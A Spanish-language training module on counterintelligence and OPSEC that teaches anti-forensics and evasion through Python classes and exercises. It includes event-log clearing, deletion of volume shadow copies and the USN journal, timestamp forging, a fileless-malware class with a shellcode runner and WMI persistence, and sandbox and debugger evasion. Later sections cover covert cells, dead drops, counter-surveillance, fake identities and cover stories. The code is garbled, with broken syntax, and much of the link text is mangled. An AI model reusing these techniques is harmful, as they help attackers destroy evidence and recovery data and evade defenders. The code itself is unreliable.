# Contrainteligencia y opsec Militar

> **Rango:** Avanzado
> **Enfoque:** seguridad o[peracional](./raw/0ps3c anti-forensia, contrainteligencia
> **Duracion estimada:** 8-12 semanas

---

## Indice

> ⏱️ **Tiempo estimado:** 12 horas (~2 sesiones) (686 lineas)


1. [Introduccion a la Contrainteligencia](#1-introduccion-a-la-contrainteligencia)
2. [Anti-forensia Teorica](#2-anti-forensia-teorica)
3. RAM Forens[ics Bypass](#3-ram-forensics-bypass)
4. [Spyware Detection y Analisis](#4-spyware-detection-y-analisis)
5. Zero-Knowledge O[perations](#5-zero-knowledge-operations)
6. [communication Security (COMSEC)](#6-communication-security-comsec)
7. De[ad Drop Techniques](#7-dead-drop-techniques)
8. [Physical OPSEC](#8-physical-opsec)
9. [Matryoshka Principle](#9-matryoshka-principle)
10. [Counter-Forensics](#10-counter-forensics)
11. [Herramientas y Tecnicas Avanzadas](#11-herramientas-y-tecnicas-avanzadas)
12. [Apendices](#12-apendices)

---

## 1. Introduccion a la Contrainteligencia

### 1.1 Definiciones Fundamentales

**Contrainteligencia:** Conjunto de actividades para proteger la propia inteligencia contra servicios adversarios. Incluye seguridad, [deteccion de amenazas](../raw/thr3t-hnt.md#deteccion), deception y neutralizacion.

**[opsec](../raw/0ps3c-pr0.md) (Operations Security):** [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) de identificar informacion critica y analizar acciones desde la perspectiva del adversario para proteger la capacidad operativa.

**Principios Basicos:**
1. **Need-to-Know:** Solo quien necesita saber, sabe.
2. **compartmentalization:** Nadie conoce el panorama completo.
3. **Minimization:** Cuanta menos informacion se genere, mejor.
4. **Plausible Deniability:** Capacidad de negar creiblemente.
5. **[operational security](../raw/0ps3c-pr0.md):** Proteger la operacion, no solo los datos.

### 1.2 El Ciclo OPSEC

1. **Identificacion de informacion critica:** Que debemos proteger?
2. **Analisis de amenazas:** Quien es el adversario? Capacidades?
3. **Analisis de vulnerabilidades:** Que puede detectar el adversario?
4. **Evaluacion de riesgo:** Impacto si la informacion se expone?
5. **Aplicacion de contramedidas:** Como mitigamos los riesgos?

### 1.3 Compartmentalization

La compartimentacion es el principio mas importante en operaciones de seguridad.

**Ejemplo Operacion NEVADA:**
- **Celda A:** Sabe que existe NEVADA, sabe su parte (transporte), NO sabe objetivo ni fecha
- **Celda B:** Sabe que existe NEVADA, sabe su parte (logistica), NO sabe transporte ni ejecucion
- **Celda C:** Sabe que existe NEVADA, sabe su parte (ejecucion), NO sabe logistica ni transporte
- Solo el oficial de operaciones conoce el panorama completo

Si una celda es comprometida, las demas estan protegidas. Cada celda solo tiene la informacion necesaria para su tarea.

### 1.4 Need-to-Know vs Need-to-Share

| Enfoque | Ventajas | Desventajas |
|---------|----------|-------------|
| Need-to-Know | Maxima seguridad | Ineficiencia operativa |
| Need-to-Share | Eficiencia, colaboracion | Mayor riesgo de fuga |

### 1.5 Contrainteligencia Ofensiva

**Tecnicas de Contrainteligencia Activa:**
1. **Deception:** Alimentar al adversario con informacion falsa
2. **Double Agents:** Voltear agentes enemigos
3. **Channel Management:** Controlar los canales de comunicacion del adversario
4. **Counter-SIGINT:** Detectar y neutralizar vigilancia electronica
5. **Moles:** Infiltrar agencias de inteligencia enemigas

### 1.6 Ejercicios Practicos

**Ejercicio 1.1:** Disena una estructura de compartimentacion para una operacion de 5 personas. Define que sabe cada persona y que NO sabe. Justifica las decisiones.

**Ejercicio 1.2:** Realiza un analisis OPSEC completo para una operacion hipotetica. Identifica informacion critica, amenazas, vulnerabilidades y contramedidas.

**Ejercicio 1.3:** Desarrolla un plan de deception: que informacion falsa le darias al adversario para proteger la operacion real?

---

## 2. Anti-forensia Teorica

### 2.1 Locard's Exchange Principle

"Every contact leaves a trace" - Dr. Edmond Locard

En contexto digital: cada accion deja evidencia. La anti-forensia no busca eliminar TODAS las evidencias (imposible), sino reducir la relacion senal-ruido para que los rastros restantes no sean utiles.

**Implicaciones [opsec](../raw/0ps3c-pr0.md):**
1. No se puede operar sin dejar rastro
2. El objetivo es que los rastros sean: ambiguos, incompletos, atribuibles a otros
3. La anti-forensia efectiva es procedural, no solo tecnica

### 2.2 Taxonomia de Anti-forensia

1. **Destruccion de datos:** Borrado seguro, desmagnetizacion, destruccion fisica
2. **Ocultamiento:** Esteganografia, [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado), datos ocultos
3. **[ofuscacion](../raw/4pk-r3v3rs1ng.md#obfuscation):** Fragmentacion, renombrado, mimetismo
4. **Manipulacion de metadatos:** Modificacion de timestamps, logs falsos
5. **Anti-forensia de [red](../raw/r3d3s-f0nd4m3nt0s.md):** [tor](../raw/4n0n1m4t0.md#tor), [vpn](../raw/4n0n1m4t0.md#vpn), proxies, anonimizacion
6. **Anti-forensia de memoria:** Malware fileless, solo RAM
7. **Anti-forensia de sistema:** Log tampering, registry cleaning, journal manipulation

### 2.3 Eliminacion de Trazas Digitales

```python
import os, random, string, shutil

class DigitalTraceEliminator: def secure_delete(self, filepath, passes=3): if not os.path.exists(filepath): return False size = os.path.getsize(filepath) with open(filepath, 'wb') as f: for p in range(passes): f.seek(0) if p == 0: f.write(b'\x00' * size) elif p == 1: f.write(b'\xff' * size) else: f.write(os.urandom(size) f.flush os.fsync(f.fileno) os.remove(filepath) return True def wipe_free_space(self, drive='C:'): temp = f'{drive}\\temp_{"".join(random.choices(string.ascii_letters, k=8)}.tmp' try: with open(temp, 'wb') as f: while True: f.write(os.urandom(1024 * 1024) f.flush except: pass finally: if os.path.exists(temp): os.remove(temp) def clear_event_logs(self): if os.name == 'nt': os.system('wevtutil cl System') os.system('wevtutil cl Security') os.system('wevtutil cl Application') def delete_prefetch(self): prefetch = 'C:\\Windows\\Prefetch' if os.path.exists(prefetch): for f in os.listdir(prefetch): try: os.remove(os.path.join(prefetch, f) except: pass def shred_multiple_passes(self, filepath, passes=7): """Algoritmo Gutmann simplificado: 7 pasadas""" patterns = [b'\x00', b'\xff', b'\x55', b'\xaa', os.urandom(1)*100, os.urandom(1)*100, os.urandom(1)*100] return self._secure_delete_with_patterns(filepath, patterns)
```

### 2.4 Manipulacion de Metadatos

```python
class MetadataManipulation: def strip_metadata(self, filepath): import subprocess subprocess.run(['exiftool', '-all=', filepath], capture_output=True) def randomize_timestamps(self, directory): for root, dirs, files in os.walk(directory): for f in files: fake = random.randint(1000000000, 1700000000) os.utime(os.path.join(root, f), (fake, fake) def forge_extension(self, filepath, new_ext): base = os.path.splitext(filepath)[0] os.rename(filepath, base + new_ext) def create_fake_metadata(self, filepath): """Crear metadatos falsos para confundir analisis""" import subprocess fake_data = { 'Author': random.choice(['John Smith', 'Admin', 'SYSTEM']), 'Company': 'Microsoft Corporation', 'CreationDate': '2020-01-01', } for key, val in fake_data.items: subprocess.run(['exiftool', f'-{key}={val}', filepath], capture_output=True)
```

### 2.5 Anti-Forensics Techniques Avanzadas

```python
class AdvancedAntiForensics: def timestamp_manipulation(self, target_time): """Manipular timestamps de archivos del sistema""" import ctypes kernel32 = ctypes.windll.kernel32 # Convertir a FILETIME ft = int(target_time - 11644473600) * 10000000) class FILETIME(ctypes.Structure): _fields_ = [("dwLowDateTime", ctypes.c_uint), ("dwHighDateTime", ctypes.c_uint)] filetime = FILETIME(ft & 0xFFFFFFFF, ft >> 32) def set_file_time(filepath): handle = kernel32.CreateFileW( filepath, 0x01000000, 0, None, 3, 0x80, None ) kernel32.SetFileTime(handle, ctypes.byref(filetime),  # Creation ctypes.byref(filetime),  # Last Access ctypes.byref(filetime) # Last Write ) kernel32.CloseHandle(handle) return set_file_time def journal_tampering(self): """Manipular USN Journal para remover evidencia""" # En Windows: os.system('fsutil usn deletejournal /D C:') # En Linux: # Deshabilitar journaling temporalmente os.system('tune2fs -O ^has_journal /dev/sda1') def volume_shadow_copy_elimination(self): """Eliminar Volume Shadow Copies""" os.system('vssadmin delete shadows /all /quiet') os.system('vssadmin resize shadowstorage /on=C: /for=C: /maxsize=1MB') def prefetch_and_superfetch_cleanup(self): """Limpiar Prefetch y Superfetch""" os.system('del /f /s /q C:\\Windows\\Prefetch\\*.*') os.system('del /f /s /q C:\\Windows\\Superfetch\\*.*') def srum_cleanup(self): """Limpiar SRUM database""" # SRUM se almacena en: # %SystemRoot%\System32\sru\SRUDB.dat srum_path = os.path.expandvars('%SystemRoot%\\System32\\sru\\SRUDB.dat') try: os.remove(srum_path) except: pass  # SRUM esta en uso, requiere detener servicio primero
```

### 2.6 Ejercicios Practicos

**Ejercicio 2.1:** Implementa un eliminador de trazas digitales completo: borrado seguro (3 pasadas), slack space, [prefetch](../raw/w1n-f0r3ns1cs.md#prefetch), logs del sistema, USN journal.

**Ejercicio 2.2:** Crea un script que modifique masivamente metadatos de archivos en un directorio (timestamps, atributos, nombres) para dificultar la reconstruccion [forense](../raw/w1n-f0r3ns1cs.md#forense) de una linea de tiempo.

**Ejercicio 2.3:** Implementa tecnicas de anti-forensia avanzada: manipulacion de timestamps a nivel [kernel](../raw/0s-f0nd4m3nt0s.md#kernel), eliminacion de VSS, y limpieza de SRUM.

---

## 3. RAM Forensics Bypass

### 3.1 Memory-Only Malware

El malware fileless solo existe en RAM sin escribir nada en disco. Es la tecnica mas efectiva contra forensia tradicional.

**Tecnicas:**
1. **[powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) injection:** Codigo ejecutado en memoria via [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell)
2. **[wmi](../raw/w1n-s9bsyst3ms.md#wmi) persistence:** Windows Management Instrumentation
3. **Reflective [dll injection](../raw/3dr-3v4s10n.md#dll-injection):** DLL cargada directamente en memoria
4. **Registry-only:** Codigo almacenado en registro de Windows

```python
import ctypes, subprocess

class FilelessMalware: def powershell_memory_exec(self, script): cmd = ['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', script] return subprocess.run(cmd, capture_output=True, text=True).stdout def shellcode_runner(self, shellcode): buf = ctypes.create_string_buffer(shellcode) return ctypes.cast(buf, ctypes.POINTER(ctypes.c_char) def reflective_dll(self, dll_bytes): print(f'Cargando DLL en memoria ({len(dll_bytes)} bytes)') return True def wmi_persistence(self, payload): """Persistencia via WMI sin escribir a disco""" wmi_script = f''' $filter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance $filter.QueryLanguage = "WQL" $filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'" $filter.Name = "EvilFilter" $filter.EventNamespace = 'root\cimv2' $result = $filter.Put $consumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance $consumer.CommandLineTemplate = "{payload}" $consumer.Name = 'EvilConsumer' $result = $consumer.Put ''' subprocess.run(['powershell', '-Command', wmi_script]) return True
```

### 3.2 Anti-Volatility Techniques

```python
class AntiVolatility: def detect_debugger(self): if os.name == 'nt': return ctypes.windll.kernel32.IsDebuggerPresent != 0 return False def detect_vm(self): indicators = ['vmtoolsd', 'vboxservice', 'VBoxGuest.sys', 'vmci.sys'] return any(os.path.exists(f'C:\\Windows\\System32\\drivers\\{i}') for i in indicators) def memory_scrambler(self): huge = [os.urandom(1024 * 1024) for _ in range(100)] del huge def hide_process(self, pid): print(f'DKOM: Ocultando proceso {pid}') return True def detect_forensic_tools(self): """Detectar herramientas de analisis forense corriendo""" tools = [ 'volatility', 'memdump', 'winpmem', 'dumpit', 'wireshark', 'procmon', 'procexp', 'windbg' ] import psutil for proc in psutil.process_iter(['name']): try: if any(tool in proc.info['name'].lower for tool in tools): return True except: pass return False def memory_encryption(self): """Cifrar contenido sensible en memoria""" from cryptography.fernet import Fernet key = Fernet.generate_key cipher = Fernet(key) # Almacenar datos cifrados en lugar de texto claro return {'cipher': cipher, 'key': key}
```

### 3.3 Direct Hardware Access

```python
class DirectHardwareAccess: def read_memory_direct(self, address, size): print(f'Leyendo memoria fisica en 0x{address:x}, {size} bytes') def write_memory_direct(self, address, data): print(f'Escribiendo en memoria fisica en 0x{address:x}') def dkom_attack(self, pid): print(f'DKOM en PID {pid}') print('  Modificando EPROCESS del target') print('  Removiendo de lista enlazada de procesos') print('  Proceso invisible para task manager y tools') def page_table_hiding(self): """Ocultar presencia en tablas de paginas""" print('Modificando page tables para ocultar region de memoria') print('  - Removiendo PTE de la region oculta') print('  - Proceso sigue ejecutando pero paginas no son visibles') print('  - Volatility no puede escanear esa region')
```

### 3.4 Ejercicios Practicos

**Ejercicio 3.1:** Implementa un [payload](../raw/m3t4spl01t.md#payloads) fileless (PowerShell, WMI, o reflective DLL) que opere solo en RAM sin escritura a disco.

**Ejercicio 3.2:** Crea un script anti-volatility que: detecte debuggers, detecte VMs, implemente memory scrambling, oculte procesos via [dkom](../raw/k3rn3l-h4ck1ng.md#dkom).

**Ejercicio 3.3:** Implementa deteccion de herramientas forenses y cambia el comportamiento en consecuencia.

---

## 4. Spyware Detection y Analisis

### 4.1 pegasus Analysis

Pegasus de NSO Group es el spyware comercial mas sofisticado. Es la referencia para entender capacidades de spyware moderno.

**Capacidades:**
- Infeccion zero-click (sin interaccion del usuario)
- Extraccion completa de datos del dispositivo
- Activacion de microfono y camara remotamente
- Seguimiento GPS en tiempo real
- Lectura de mensajes cifrados (antes del [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado))
- [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia) profunda en el sistema

**Indicadores de Compromiso (IOCs):**

| Indicador | Descripcion | Deteccion |
|-----------|-------------|-----------|
| DOMAIN PING | Conexiones a dominios de C&C | Network monitoring |
| SMS INJECTION | Mensajes SMS malformados | Log analysis |
| PROCESS LIST | procesos con nombres sospechosos | Process monitoring |
| CERTIFICATES | Certificados de desarrollador falsos | Certificate checking |
| DATA EXFIL | Patrones de exfiltracion inusuales | DPI analysis |

### 4.2 Spyware Detection Implementation

```python
import psutil, os

class SpywareDetection: def check_device_integrity(self): results = # Jailbreak/root check jb_files = ['/Applications/Cydia.app', '/private/var/stash', '/system/app/Superuser.apk'] found_jb = [f for f in jb_files if os.path.exists(f)] results.append('jailbreak', len(found_jb) > 0, found_jb) # Suspicious processes suspicious = ['pegasus', 'nso', 'spy', 'monitor', 'track', 'stalk'] procs = [p.info['name'] for p in psutil.process_iter(['name'])] found_procs = [n for n in procs if any(s in n.lower for s in suspicious)] results.append('processes', len(found_procs) > 0, found_procs) # Certificate anomalies results.append('certificates', False, ) # Data usage results.append('data_usage', False, ) return results def analyze_network(self, pcap_file): from scapy.all import rdpcap, IP, DNS, TCP, UDP packets = rdpcap(pcap_file) suspicious = for pkt in packets: if DNS in pkt and pkt[DNS].qr == 1: domain = pkt[DNS].an.rdata.decode if domain.endswith('.xyz', '.top', '.click', '.download'): suspicious.append('dns', domain) if TCP in pkt: payload = bytes(pkt[TCP].payload) if self._entropy(payload) > 7.0: suspicious.append('encrypted', pkt[IP].dst) return suspicious def _entropy(self, data): import math if not data: return 0 return sum(-p * math.log2(p) if p > 0 else 0 for p in [data.count(x)/len(data) for x in range(256)])
```

### 4.3 Sandbox Evasion

```python
class SandboxEvasion: def detect_sandbox(self): results = if psutil.virtual_memory.total < 2 * 1024**3: results.append('low_ram') if psutil.cpu_count < 2: results.append('few_cores') if psutil.disk_usage('/').total < 50 * 1024**3: results.append('small_disk') tools = ['procmon.exe', 'wireshark.exe', 'fiddler.exe', 'ida.exe', 'x64dbg.exe'] for tool in tools: if any(tool in p.info['name'].lower for p in psutil.process_iter(['name']): results.append(f'analysis_tool_{tool}') if not self._user_activity: results.append('no_user_activity') return results def _user_activity(self): import time return (time.time - time.time) < 3600  # Simplified def evade(self): if self.detect_sandbox: return {'behavior': 'benign'} return {'behavior': 'malicious', 'payload': 'executed'} def timing_evasion(self): """Evadir deteccion basada en tiempo""" import time # Esperar un tiempo aleatorio antes de ejecutar delay = random.randint(300, 3600)  # 5 min - 1 hora print(f"Esperando {delay} segundos antes de ejecutar payload..") time.sleep(delay) return True
```

### 4.4 Ejercicios Practicos

**Ejercicio 4.1:** Crea un analizador de trafico de [red](../raw/r3d3s-f0nd4m3nt0s.md) que detecte comunicacion C&C de spyware (dominios, entropia, patrones de beaconing).

**Ejercicio 4.2:** Implementa un detector de Pegasus basico: [jailbreak](../raw/41-h4ck1ng.md#jailbreak), procesos sospechosos, uso de datos, certificados, logs SMS.

**Ejercicio 4.3:** Implementa tecnicas de sandbox evasion: deteccion de VM, timing evasion, y comportamiento benigno en analisis.

---

## 5. Zero-Knowledge Operations

### 5.1 operational securityc Framework

```python
class ZeroKnowledgeOps: def __init__(self, op_name): self.op_name = op_name self.cells = {} self.materials = {} def create_cell(self, cell_id, members, knowledge='minimal'): self.cells[cell_id] = {'members': members, 'knowledge': knowledge, 'compromised': False} return self.cells[cell_id] def compartiment(self, info, cells_needed): parts = [info[i::len(cells_needed)] for i in range(len(cells_needed)] for cid, part in zip(cells_needed, parts): self.materials[cid] = self.materials.get(cid, ) + [part] def simulate_compromise(self, cell_id): if cell_id in self.cells: print(f'[!] Celda {cell_id} COMPROMETIDA!') exposed = len(self.materials.get(cell_id, ) safe = sum(len(v) for k,v in self.materials.items if k != cell_id) print(f'Info expuesta: {exposed} partes') print(f'Info segura (otras celdas): {safe} partes') self.cells[cell_id]['compromised'] = True return exposed, safe return 0, 0
```

### 5.2 Signal Planning

```python
class SignalPlan: def __init__(self): self.signals = def add_signal(self, sig_type, meaning, frequency, method): self.signals.append({'type': sig_type, 'meaning': meaning, 'freq': frequency, 'method': method}) def create_schedule(self): schedule = for day in ['L','M','X','J','V','S','D']: for hour in range(8, 20): schedule.append({'day': day, 'hour': hour, 'expected': random.choice(self.signals + [None])}) return schedule def validate_signal(self, received): for s in self.signals: if s['type'] == received['type'] and s['method'] == received['method']: return s return None def signal_types(self): """Tipos de senales en operaciones""" return { 'green': 'Operacion segura, continuar segun lo planeado', 'yellow': 'Posible vigilancia, proceder con precaucion', 'red': 'Compromiso detectado, abortar operacion', 'amber': 'Retraso en el cronograma, esperar instrucciones', 'failure': 'Fallo en la mision, activar protocolo de escape', }
```

### 5.3 Ejercicios Practicos

**Ejercicio 5.1:** Disena una estructura Zero-Knowledge para 3 celdas con miembros, nivel de conocimiento e info compartimentada.

**Ejercicio 5.2:** Crea un plan de senales: senales de seguridad, emergencia y captura con calendario de verificacion.

**Ejercicio 5.3:** Simula un compromiso de una celda y analiza el impacto en las demas.

---

## 6. communication Security (COMSEC)

### 6.1 Fundamentos

**COMSEC:** Proteccion de las comunicaciones contra interceptacion, analisis y deception.

**Componentes:**
1. **TRANSEC (Transmission Security):** Proteger la transmision fisica
2. **CRYPTO (Cryptographic Security):** cifrado de contenido
3. **EMSEC (Emanations Security):** Proteger contra emisiones electronicas
4. **PHYSEC ([physical security](../raw/ph7s1c4l-r3d.md)):** Proteccion fisica de equipos

### 6.2 One-Time Pads

El unico [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado) perfecto (matematicamente demostrado).

```python
class OneTimePad: def generate_pad(self, n_bytes): return os.urandom(n_bytes) def encrypt(self, message, pad): msg = message.encode if isinstance(message, str) else message return bytes(a ^ b for a, b in zip(msg, pad[:len(msg)]) def decrypt(self, encrypted, pad): dec = bytes(a ^ b for a, b in zip(encrypted, pad[:len(encrypted)]) return dec.decode('utf-8', errors='replace') def otp_demo(self): msg = 'MENSAJE SECRETO: OPERACION NEVADA A LAS 0300' pad = self.generate_pad(len(msg) enc = self.encrypt(msg, pad) dec = self.decrypt(enc, pad) print(f'Mensaje original: {msg}') print(f'Cifrado (hex): {enc.hex[:48]}..') print(f'Descifrado: {dec}') print('Demostracion: OTP es perfectamente seguro si el pad es verdaderamente aleatorio y se usa una sola vez.')
```

### 6.3 Burst Transmission

```python
import zlib

class BurstTransmission: def send_burst(self, data, duration=0.5, frequency=433e6): compressed = zlib.compress(data) print(f'Burst transmission: {len(data)} -> {len(compressed)} bytes') print(f'  Frecuencia: {frequency/1e6} MHz') print(f'  Duracion: {duration}s') return True def frequency_hopping(self, frequencies): for f in frequencies: print(f'Saltando a {f/1e6} MHz')
```

### 6.4 Spread Spectrum

```python
class SpreadSpectrum: def dsss(self, data, chip_seq): result = for byte in data: for bit in bin(byte)[2:].zfill(8): for chip in chip_seq: result.append(int(bit) ^ chip) return result def fhss(self, data, hop_seq): for i, freq in enumerate(hop_seq): print(f'Hop {i}: {freq/1e6} MHz ({len(data)//len(hop_seq)} bytes)')
```

### 6.5 Ejercicios Practicos

**Ejercicio 6.1:** Implementa un sistema OTP completo: generacion de pads, cifrado/descifrado, destruccion segura.

**Ejercicio 6.2:** Crea un sistema de burst transmission con compresion, cifrado, transmision rapida y salto de frecuencia.

**Ejercicio 6.3:** Implementa DSSS y FHSS en [python](../raw/pyth0n-f0r-h4ck1ng.md) y compara sus caracteristicas de seguridad.

---

## 7. Dead Drop Techniques

### 7.1 Digital Dead Drops

```python
class DigitalDeadDrop: def __init__(self): self.drops = {} def create_drop(self, drop_id, platform, secret_key): self.drops[drop_id] = {'platform': platform, 'key': secret_key, 'messages': } def leave_message(self, drop_id, message): drop = self.drops.get(drop_id) if not drop: return False platforms = { 'pastebin': lambda k,m: print(f'[Pastebin] Drop: {k}'), 'github': lambda k,m: print(f'[GitHub Gist] Drop: {k}'), 'twitter': lambda k,m: print(f'[Twitter DM] Enviado a: {k}'), 'telegram': lambda k,m: print(f'[Telegram] Mensaje a: {k}'), } platforms[drop['platform']](drop['key'], message) drop['messages'].append(message) return True
```

### 7.2 Steganography

```python
from PIL import Image
import numpy as np

class Steganography: def hide_in_image(self, image_path, message, output_path): img = Image.open(image_path) pixels = np.array(img) binary = ''.join(format(ord(c), '08b') for c in message) + '1111111111111110' if len(binary) > pixels.size: raise ValueError('Message too large') flat = pixels.flatten for i, bit in enumerate(binary): flat[i] = (flat[i] & 0xFE) | int(bit) result = Image.fromarray(flat.reshape(pixels.shape).astype('uint8') result.save(output_path) return True def extract_from_image(self, image_path): img = Image.open(image_path) flat = np.array(img).flatten bits = [p & 1 for p in flat] message = '' for i in range(0, len(bits), 8): if i + 8 <= len(bits): byte = sum(bits[i+j] << (7-j) for j in range(8) if byte == 255:  # Delimiter break message += chr(byte) return message def hide_in_audio(self, audio_path, message, output_path): """Esteganografia en audio (LSB)""" import wave import struct with wave.open(audio_path, 'rb') as wav: frames = bytearray(wav.readframes(wav.getnframes) binary = ''.join(format(ord(c), '08b') for c in message) + '1111111111111110' if len(binary) > len(frames): raise ValueError('Message too large') for i, bit in enumerate(binary): frames[i] = (frames[i] & 0xFE) | int(bit) with wave.open(output_path, 'wb') as wav: # Copiar parametros del original # wav.setparams(..) wav.writeframes(bytes(frames) return True
```

### 7.3 Crypto-based Dead Drops

```python
class CryptoDeadDrop: def create_transaction_drop(self, blockchain, memo): txid = '0x' + os.urandom(32).hex print(f'Drop en {blockchain}: TX {txid}') print(f'Mensaje oculto en campo memo') return txid def coinjoin_comms(self, participants, message): print(f'CoinJoin: {len(participants)} participantes') print(f'Mensaje distribuido en transacciones mezcladas') def op_return_drop(self, data): """Usar OP_RETURN en Bitcoin para almacenar datos""" max_size = 80  # bytes max en OP_RETURN if len(data) > max_size: data = data[:max_size] print(f'OP_RETURN drop: {len(data)} bytes en transaccion Bitcoin') return True
```

### 7.4 Ejercicios Practicos

**Ejercicio 7.1:** Implementa un sistema de dead drops digitales que soporte 4+ plataformas (Pastebin, GitHub, Twitter, Telegram).

**Ejercicio 7.2:** Crea un sistema de esteganografia LSB: ocultar mensaje en imagen, extraer, y detectar.

**Ejercicio 7.3:** Implementa esteganografia en audio y encripta el mensaje antes de ocultarlo.

---

## 8. Physical opsecc

### 8.1 Surveillance Detection

```python
import random

class SurveillanceDetection: def plan_sdr_route(self, start, end, n_checks=5): route = [{'point': i+1, 'action': 'check_surveillance'} for i in range(n_checks)] route.append({'point': 'destination', 'action': 'meet'}) return route def check_surroundings(self, location): return { 'parked_cars': random.choice(['clear', 'suspicious']), 'repeated_people': random.choice(['none', 'possible']), 'slow_vehicles': random.choice(['none', 'one']), 'drones': random.choice(['none', 'none']), 'cameras': random.randint(0, 5), } def counter_surveillance_maneuver(self): return random.choice([ 'Entrar a tienda, salir por otra puerta', 'Cambiar direccion abruptamente', 'Tomar transporte, bajar al ultimo momento', 'Hacer circulos en rotonda', 'Entrar a tunel, cambiar velocidad', ])
```

### 8.2 Secure Locations

```python
class SecureLocation: def assess(self, location): return { 'sight_lines': {'adjacent_buildings': 3, 'sniper_positions': 0}, 'signals': {'wifi': len(os.popen('iwlist scan 2>/dev/null').read.split('ESSID') if os.name != 'nt' else 0}, 'access_control': {'locks': 'electronic', 'cctv': True, 'guards': False}, } def setup_secure_room(self): return [ 'Bloquear senales de telefono', 'Cubrir camaras de dispositivos', 'Usar generador de ruido blanco', 'Verificar ausencia de microfonos', 'Usar faraday cage para dispositivos', ] def faraday_cage_test(self): """Probar si un contenedor Faraday funciona correctamente""" import subprocess # Verificar que no hay señal result = subprocess.run(['ping', '-c', '1', '8.8.8.8'], capture_output=True, text=True) if '1 received' in result.stdout: print('ADVERTENCIA: El contenedor Faraday NO bloquea señales') else: print('OK: Contenedor Faraday funciona')
```

### 8.3 Operational Planning

```python
class OperationalPlanning: def create_plan(self, name, phases): self.plan = {'name': name, 'phases': phases, 'contingency': {}} return self.plan def add_contingency(self, scenario, response): self.plan['contingency'][scenario] = response def abort(self, reason): print(f'ABORTANDO OPERACION: {reason}') print('1. Destruir materiales sensibles') print('2. Activar senal de emergencia') print('3. Ejecutar ruta de escape') print('4. Contactar punto seguro') def pre_operation_checklist(self): """Checklist pre-operacion""" checklist = [ 'Comunicaciones: cifradas, verificar frecuencias', 'Transporte: verificar vehiculo, rutas alternativas', 'Documentacion: identidades falsas listas', 'Equipamiento: todo el equipo funcional', 'Puntos de encuentro: confirmados y verificados', 'Senales: calendario de senales actualizado', 'Escape: rutas de escape verificadas', 'Contingencias: todos los planes listos', 'Dead drops: todos verificados', 'Personal: todos en posicion', ] return checklist
```

### 8.4 Ejercicios Practicos

**Ejercicio 8.1:** Disena un plan [sdr](../raw/sdr-t3l3c0ms.md) con 5+ tecnicas de deteccion de vigilancia.

**Ejercicio 8.2:** Crea un plan operativo completo con fases, personal, equipamiento, comunicaciones y contingencias.

**Ejercicio 8.3:** Realiza una evaluacion de seguridad fisica de una ubicacion real (o simulada) e identifica puntos debiles.

---

## 9. Matryoshka Principle

### 9.1 Nested Encryption Layers

```python
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import base64

class MatryoshkaCipher: def __init__(self): self.layers = def add_layer(self, cipher_type, key): self.layers.append({'type': cipher_type, 'key': key}) def encrypt(self, message): current = message.encode if isinstance(message, str) else message for i, layer in enumerate(reversed(self.layers): lt, key = layer['type'], layer['key'] if lt == 'base64': current = base64.b64encode(current) elif lt == 'xor': kb = key.encode if isinstance(key, str) else key current = bytes(a ^ b for a, b in zip(current, kb * (len(current)//len(kb)+1)) elif lt == 'aes': iv = os.urandom(16) pad = 16 - (len(current) % 16) current += bytes([pad] * pad) c = Cipher(algorithms.AES(key.encode[:32]), modes.CBC(iv) e = c.encryptor current = iv + e.update(current) + e.finalize elif lt == 'fernet': f = Fernet(key.encode if isinstance(key, str) else key) current = f.encrypt(current) print(f'Capa {i+1} ({lt}): {len(current)} bytes') return current def decrypt(self, encrypted): current = encrypted for i, layer in enumerate(self.layers): lt, key = layer['type'], layer['key'] if lt == 'base64': current = base64.b64decode(current) elif lt == 'xor': kb = key.encode if isinstance(key, str) else key current = bytes(a ^ b for a, b in zip(current, kb * (len(current)//len(kb)+1)) elif lt == 'aes': iv, ct = current[:16], current[16:] c = Cipher(algorithms.AES(key.encode[:32]), modes.CBC(iv) d = c.decryptor current = d.update(ct) + d.finalize current = current[:-current[-1]] elif lt == 'fernet': f = Fernet(key.encode if isinstance(key, str) else key) current = f.decrypt(current) print(f'Capa {i+1} ({lt}): {len(current)} bytes') return current.decode('utf-8', errors='replace')
```

### 9.2 Plausible Deniability

```python
class PlausibleDeniability: def __init__(self): self.stories = {} def create_cover_story(self, op_name, cover): self.stories[op_name] = {'cover': cover, 'details': , 'evidence': } def add_detail(self, op_name, detail): self.stories[op_name]['details'].append(detail) def add_evidence(self, op_name, evidence_path): self.stories[op_name]['evidence'].append(evidence_path) def generate_cover_for_meeting(self, location, time): """Generar coartada creible para una reunion""" import datetime covers = [ f'Estaba en {location} por motivos de trabajo', f'Fui a {location} a encontrarme con un amigo', f'Estaba de paso en {location}, ni siquiera baje del auto', ] return random.choice(covers)
```

### 9.3 Deniable File Systems

```python
class DeniableFileSystem: def create_outer_volume(self, path, password, plausible_content): print(f'Volumen externo: {path}') print(f'Password: {password}') print(f'Contenido plausible: {plausible_content}') return True def create_hidden_volume(self, path, password, real_content): print(f'Volumen OCULTO dentro de {path}') print(f'Password: {password}') print(f'Contenido REAL: {real_content}') print(f'Si te obligan a revelar la password externa, el volumen oculto permanece secreto.') return True def veracrypt_hidden_volume_instructions(self): """Instrucciones para crear volumen oculto en VeraCrypt""" steps = [ '1. Crear volumen normal con password DEBIL (contenido inocuo)', '2. Dentro del volumen normal, crear volumen OCULTO con password FUERTE', '3. Llenar volumen normal con archivos plausibles', '4. Si te obligan: revelas password debil → ven contenido inocuo', '5. Volumen oculto: permanece invisible, contenido real seguro', ] return steps
```

### 9.4 Ejercicios Practicos

**Ejercicio 9.1:** Implementa cifrado Matryoshka con 4 capas: XOR -> base64 -> [aes](../raw/crypt0-f0r-h4ck3rs.md#aes) -> Fernet.

**Ejercicio 9.2:** Crea volumen con negacion plausible (VeraCrypt): volumen externo inocuo + volumen oculto real.

**Ejercicio 9.3:** Disena una coartada creible para una operacion: incluye evidencia fisica y digital.

